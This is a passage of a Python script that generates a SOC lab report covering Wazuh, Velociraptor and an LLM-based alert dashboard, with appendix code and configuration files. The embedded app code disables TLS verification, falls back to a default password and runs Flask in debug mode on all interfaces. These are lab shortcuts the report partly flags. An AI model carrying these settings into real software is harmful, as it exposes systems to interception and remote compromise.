     "correctly classified by the syscheck module within the 60-second scan interval. The malware simulation "
     "further confirmed FIM's ability to detect payload drops and .bashrc persistence modifications."),
    ("Malware Detection", "The simulated malware scenario successfully demonstrated multi-stage attack detection: "
     "payload delivery (T1105), reconnaissance (T1592), and persistence via .bashrc modification (T1546.004) — "
     "all detectable through the FIM monitoring pipeline."),
    ("AI Analysis Quality", "The Llama 3.3 70B model correctly identified the brute-force attack pattern, provided "
     "accurate MITRE ATT&CK mappings, and generated actionable recommendations aligned with SOC best practices."),
    ("Forensic Capability", "Velociraptor successfully collected login history and process lists from the compromised "
     "endpoint, providing the deep investigation capability needed for incident response."),
]

for title, desc in findings:
    p = doc.add_paragraph()
    tnr(p.add_run(f"{title}: "), bold=True)
    tnr(p.add_run(desc))

doc.add_page_break()

# ========== SECTION 9: CHALLENGES & LESSONS LEARNED ==========
doc.add_heading("9. Challenges & Lessons Learned", level=1)

doc.add_paragraph(
    "Building a multi-tool SOC lab involved several technical challenges that required troubleshooting "
    "and creative problem-solving. This section documents the most significant issues encountered and "
    "their resolutions."
)

challenges = [
    (
        "9.1 Velociraptor GUI Binding (127.0.0.1 vs 0.0.0.0)",
        "By default, the Velociraptor GUI binds to 127.0.0.1 (localhost), making it inaccessible from "
        "external machines. Since the server was hosted on a Linode VPS and needed to be accessed from "
        "the host machine's browser, this was a significant obstacle.",
        "Modified the server.config.yaml to change the GUI bind_address from 127.0.0.1 to 0.0.0.0, "
        "allowing connections from any IP. Additionally, the Linode firewall was configured to allow "
        "inbound traffic on port 8889.",
    ),
    (
        "9.2 Firewall Port Configuration",
        "The Linode VPS required multiple ports to be open for different services: Wazuh Manager (1514, 1515), "
        "Wazuh Dashboard (443), Wazuh Indexer (9200), Wazuh API (55000), Velociraptor Frontend (8000), and "
        "Velociraptor GUI (8889). Initial connectivity failures were caused by the Linode Cloud Firewall "
        "blocking these ports.",
        "Configured the Linode Cloud Firewall to allow inbound TCP traffic on all required ports. Additionally, "
        "the host machine's local firewall was verified to allow outbound connections to the VPS.",
    ),
    (
        "9.3 AI API Rate Limits (Gemini to Groq Migration)",
        "The project initially used Google's Gemini API for AI analysis. However, Gemini's free tier imposed "
        "strict rate limits that caused frequent 429 (Too Many Requests) errors during testing, making the "
        "dashboard unreliable for live demonstrations.",
        "Migrated from Gemini to Groq's free inference API, which provides access to Llama 3.3 70B with "
        "significantly higher rate limits and faster response times. Groq's free tier proved far more suitable "
        "for a lab environment with frequent analysis requests.",
    ),
    (
        "9.4 FIM Scan Frequency",
        "The default Wazuh FIM scan frequency is 43,200 seconds (12 hours), which is far too slow for a lab "
        "demonstration. File changes made during testing would not be detected for hours, making it impossible "
        "to demonstrate FIM in real-time.",
        "Reduced the syscheck frequency to 60 seconds in the Wazuh agent's ossec.conf file and enabled "
        "scan_on_start to perform an immediate baseline scan. This allowed FIM changes to be detected within "
        "one minute of occurrence. Note: in production, a 60-second scan interval would be too aggressive and "
        "could impact system performance — the default 12-hour interval is more appropriate for real deployments.",
    ),
    (
        "9.5 Wazuh Indexer SSL Certificate Verification",
        "The Wazuh Indexer uses self-signed SSL certificates, which caused Python's requests library to reject "
        "HTTPS connections with SSL verification errors when the SOC Dashboard tried to query the indexer.",
        "Disabled SSL verification in the requests calls (verify=False) and suppressed urllib3 InsecureRequestWarning "
        "warnings. While acceptable for a lab environment, production deployments should use properly signed "
        "certificates or configure custom CA bundles.",
    ),
]

for title, problem, solution in challenges:
    doc.add_heading(title, level=2)
    p = doc.add_paragraph()
    tnr(p.add_run("Problem: "), bold=True)
    tnr(p.add_run(problem))
    p = doc.add_paragraph()
    tnr(p.add_run("Solution: "), bold=True)
    tnr(p.add_run(solution))

doc.add_heading("9.6 Lessons Learned", level=2)

lessons = [
    "Infrastructure-as-Code is essential — deploying multiple services manually is error-prone; Docker Compose and configuration management tools greatly simplify reproducibility.",
    "Defense in depth works — combining real-time alerting (Wazuh), automated response (Active Response), forensic investigation (Velociraptor), and AI analysis provides comprehensive coverage.",
    "AI augments but does not replace human analysts — the LLM provided excellent summaries and MITRE mappings, but its recommendations still require human judgment for prioritization and implementation.",
    "Lab environments differ from production — settings optimized for demonstration (60s FIM scans, disabled SSL verification) must be adjusted for real-world deployments.",
    "Open-source tools are production-ready — Wazuh, Velociraptor, and open LLMs like Llama 3.3 provide enterprise-grade capabilities at zero licensing cost.",
]

for i, lesson in enumerate(lessons, 1):
    doc.add_paragraph(f"{i}. {lesson}")

doc.add_page_break()

# ========== SECTION 10: CONCLUSION & FUTURE WORK ==========
doc.add_heading("10. Conclusion & Future Work", level=1)

doc.add_heading("10.1 Conclusion", level=2)

doc.add_paragraph(
    "This project successfully demonstrated a complete Security Operations Center (SOC) workflow using "
    "open-source tools in a controlled lab environment. The lab integrated three core components — "
    "Wazuh SIEM for real-time monitoring and automated response, Velociraptor for digital forensics and "
    "endpoint investigation, and a custom AI-powered dashboard for intelligent alert analysis."
)

doc.add_paragraph(
    "The attack simulation validated the detection pipeline end-to-end: the Hydra SSH brute-force attack "
    "from the Kali VM was detected by Wazuh within seconds, automatically blocked via Active Response, "
    "investigated via Velociraptor's artifact collection, and analyzed by the AI dashboard which correctly "
    "identified the attack pattern and mapped it to MITRE ATT&CK techniques."
)

doc.add_paragraph(
    "The File Integrity Monitoring component proved effective at detecting unauthorized file changes, "
    "while the AI analysis layer demonstrated how large language models can assist SOC analysts by "
    "automating the initial triage process — summarizing alerts, identifying patterns, and recommending "
    "response actions."
)

doc.add_paragraph(
    "Overall, this project shows that a functional SOC can be built using entirely free and open-source "
    "tools, making enterprise-grade security monitoring accessible to organizations of all sizes and "
    "providing a practical learning platform for aspiring cybersecurity professionals."
)

doc.add_heading("10.2 Future Work", level=2)

doc.add_paragraph("Several enhancements could extend the capabilities of this SOC lab:")

future_items = [
    ("Windows Endpoint Monitoring", "Reactivate the Windows 11 agent and configure Sysmon integration "
     "for detailed process creation, network connection, and registry change monitoring."),
    ("SOAR Integration", "Implement a Security Orchestration, Automation, and Response (SOAR) platform "
     "to create automated playbooks for common incident types."),
    ("Threat Intelligence Feeds", "Integrate open-source threat intelligence feeds (MISP, AbuseIPDB) to "
     "enrich alerts with reputation data and known IOC correlation."),
    ("Multi-Model AI Comparison", "Test multiple LLMs (GPT-4, Claude, Gemini, Llama) against the same "
     "alert data to compare accuracy, speed, and analysis quality."),
    ("Network Traffic Analysis", "Deploy Suricata or Zeek for network intrusion detection to complement "
     "Wazuh's host-based detection with network-level visibility."),
    ("Automated Reporting", "Extend the SOC Dashboard to generate periodic PDF reports summarizing "
     "security posture, trends, and AI-recommended actions."),
    ("Advanced Attack Scenarios", "Simulate more sophisticated attacks including lateral movement, "
     "privilege escalation, data exfiltration, and persistence mechanisms."),
]

for title, desc in future_items:
    p = doc.add_paragraph()
    tnr(p.add_run(f"{title} — "), bold=True)
    tnr(p.add_run(desc))

doc.add_page_break()

# ========== SECTION 11: APPENDIX ==========
doc.add_heading("11. Appendix", level=1)

doc.add_heading("11.1 SOC Dashboard Source Code (app.py)", level=2)

doc.add_paragraph(
    "The complete source code for the Flask-based SOC Dashboard application. This file handles all "
    "API endpoints for alert fetching, FIM queries, agent listing, and AI-powered analysis."
)

APP_PY_CODE = '''import os, json, urllib3, requests
from groq import Groq
from flask import Flask, render_template, jsonify, request
from dotenv import load_dotenv

load_dotenv()
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
app = Flask(__name__)

WAZUH_URL = os.getenv("WAZUH_URL", "https://139.162.62.154")
WAZUH_API_PORT = os.getenv("WAZUH_API_PORT", "55000")
INDEXER_URL = os.getenv("INDEXER_URL", "https://139.162.62.154")
INDEXER_PORT = os.getenv("INDEXER_PORT", "9200")
INDEXER_USER = os.getenv("INDEXER_USER", "admin")
INDEXER_PASS = os.getenv("INDEXER_PASS", "SecretPassword")
GROQ_API_KEY = os.getenv("GROQ_API_KEY", "")

WAZUH_API_BASE = f"{WAZUH_URL}:{WAZUH_API_PORT}"
INDEXER_BASE = f"{INDEXER_URL}:{INDEXER_PORT}"

def indexer_search(query_body, index="wazuh-alerts-*", size=30):
    resp = requests.post(
        f"{INDEXER_BASE}/{index}/_search",
        auth=(INDEXER_USER, INDEXER_PASS),
        json={"size": size, **query_body},
        verify=False, timeout=15)
    return resp.json()

def ai_generate(prompt, max_tokens=1024):
    client = Groq(api_key=GROQ_API_KEY)
    chat = client.chat.completions.create(
        model="llama-3.3-70b-versatile",
        messages=[{"role": "user", "content": prompt}],
        max_tokens=max_tokens, temperature=0.3)
    return chat.choices[0].message.content

@app.route("/")
def index():
    return render_template("index.html")

@app.route("/api/alerts")
def get_alerts():
    limit = request.args.get("limit", 30, type=int)
    level_min = request.args.get("level_min", 3, type=int)
    query = {"query": {"bool": {"must": [
        {"range": {"rule.level": {"gte": level_min}}},
        {"range": {"timestamp": {"gte": "now-24h"}}}
    ]}}, "sort": [{"timestamp": {"order": "desc"}}]}
    result = indexer_search(query, size=limit)
    # ... process and return alerts ...

@app.route("/api/analyze", methods=["POST"])
def analyze_alerts():
    # Pull high-severity alerts + FIM events from indexer
    # Format into structured prompt
    # Send to Groq / Llama 3.3 70B
    # Return AI analysis as markdown
    ...

if __name__ == "__main__":
    app.run(debug=True, host="0.0.0.0", port=5000)'''

add_code_block(APP_PY_CODE)

doc.add_heading("11.2 Wazuh Agent Configuration (ossec.conf) — FIM Section", level=2)

doc.add_paragraph(
    "The syscheck section of the Wazuh agent's ossec.conf file on the Ubuntu VM, configured to monitor "
    "the /home directory with a 60-second scan interval:"
)

add_code_block(
    '<syscheck>\n'
    '  <disabled>no</disabled>\n'
    '  <frequency>60</frequency>\n'
    '  <scan_on_start>yes</scan_on_start>\n'
    '  <directories check_all="yes" realtime="yes"\n'
    '    report_changes="yes">/home</directories>\n'
    '  <ignore>/home/.cache</ignore>\n'
    '</syscheck>'
)

doc.add_heading("11.3 Wazuh Manager Configuration — Active Response", level=2)

doc.add_paragraph(
    "The Active Response section of the Wazuh Manager's ossec.conf, configured to automatically "
    "block attacker IPs when SSH brute-force is detected:"
)

add_code_block(
    '<command>\n'
    '  <name>firewall-drop</name>\n'
    '  <executable>firewall-drop</executable>\n'
    '  <timeout_allowed>yes</timeout_allowed>\n'
    '</command>\n\n'
    '<active-response>\n'
    '  <command>firewall-drop</command>\n'
    '  <location>local</location>\n'
    '  <rules_id>5763</rules_id>\n'
    '  <timeout>600</timeout>\n'
    '</active-response>'
)

doc.add_heading("11.4 AI Analysis Prompt Template", level=2)

doc.add_paragraph(
    "The prompt template sent to the Llama 3.3 70B model for security alert analysis:"
)

add_code_block(
    'You are a SOC (Security Operations Center) analyst.\n'
    'Analyze these Wazuh security alerts and provide:\n\n'
    '1. **Executive Summary** - Brief overview of security posture\n'
    '2. **Critical Findings** - High-priority threats detected\n'
    '3. **Attack Analysis** - Per-attack breakdown:\n'
    '   - What happened\n'
    '   - Source/target information\n'
    '   - MITRE ATT&CK technique (if applicable)\n'
    '   - Severity assessment\n'
    '4. **File Integrity** - Suspicious file changes\n'
    '5. **Recommendations** - Actionable next steps\n\n'
    'Format your response in clean markdown.\n'
    'Be specific about IPs, timestamps, and rule IDs.\n\n'
    'Here are the alerts:\n'
    '{alerts_json}'
)

doc.add_heading("11.5 Docker Compose Configuration", level=2)

doc.add_paragraph(
    "The Wazuh stack was deployed using Docker Compose with the official single-node configuration. "
    "Key service definitions from the docker-compose.yml:"
)

add_code_block(
    'version: "3"\n'
    'services:\n'
    '  wazuh.manager:\n'
    '    image: wazuh/wazuh-manager:4.14.4\n'
    '    hostname: wazuh.manager\n'
    '    ports:\n'
    '      - "1514:1514"     # Agent communication\n'
    '      - "1515:1515"     # Agent registration\n'
    '      - "514:514/udp"   # Syslog\n'
    '      - "55000:55000"   # Wazuh API\n'
    '    volumes:\n'
    '      - wazuh_api_configuration:/var/ossec/api/configuration\n'
    '      - wazuh_etc:/var/ossec/etc\n'
    '      - wazuh_logs:/var/ossec/logs\n\n'
    '  wazuh.indexer:\n'
    '    image: wazuh/wazuh-indexer:4.14.4\n'
    '    hostname: wazuh.indexer\n'
    '    ports:\n'
    '      - "9200:9200"     # OpenSearch REST API\n'
    '    environment:\n'
    '      - OPENSEARCH_JAVA_OPTS=-Xms512m -Xmx512m\n\n'
    '  wazuh.dashboard:\n'
    '    image: wazuh/wazuh-dashboard:4.14.4\n'
    '    hostname: wazuh.dashboard\n'
    '    ports:\n'
    '      - "443:5601"      # Dashboard web UI\n'
    '    depends_on:\n'
    '      - wazuh.indexer'
)

doc.add_heading("11.6 SOC Dashboard Environment Variables (.env)", level=2)

doc.add_paragraph(
    "The .env file configures the SOC Dashboard's connection to Wazuh and the AI service. "
    "Sensitive values should be replaced with actual credentials:"
)

add_code_block(
    '# Wazuh API connection\n'
    'WAZUH_URL=https://139.162.62.154\n'
    'WAZUH_API_PORT=55000\n'
    'WAZUH_USER=wazuh-wui\n'
    'WAZUH_PASS=<your-wazuh-password>\n\n'
    '# Wazuh Indexer (OpenSearch)\n'
    'INDEXER_URL=https://139.162.62.154\n'
    'INDEXER_PORT=9200\n'
    'INDEXER_USER=admin\n'
    'INDEXER_PASS=<your-indexer-password>\n\n'
    '# Groq AI API (free tier)\n'
    'GROQ_API_KEY=<your-groq-api-key>'
)

doc.add_heading("11.7 Environment & Versions", level=2)

add_table(
    ["Component", "Version", "Notes"],
    [
        ["Wazuh Manager", "4.14.4", "Docker deployment"],
        ["Wazuh Dashboard", "4.14.4", "OpenSearch-based"],
        ["Wazuh Indexer", "4.14.4", "OpenSearch 2.x"],
        ["Velociraptor", "0.72.0", "Linux amd64 binary"],
        ["Ubuntu VM", "24.04 LTS", "VMware Workstation"],
        ["Kali Linux", "Latest rolling", "VMware Workstation"],
        ["Windows 11 VM", "23H2", "VMware Workstation"],
        ["Python", "3.12+", "Flask backend"],
        ["Flask", "3.x", "Web framework"],
        ["Groq SDK", "Latest", "LLM API client"],
        ["Llama 3.3", "70B Versatile", "Via Groq free tier"],
        ["Linode VPS", "2 GB plan", "Singapore region"],
    ],
)


# ========== SAVE ==========
output_path = r"c:\Users\admin\Desktop\SOC_Lab_Report.docx"
doc.save(output_path)
print(f"Report saved to: {output_path}")
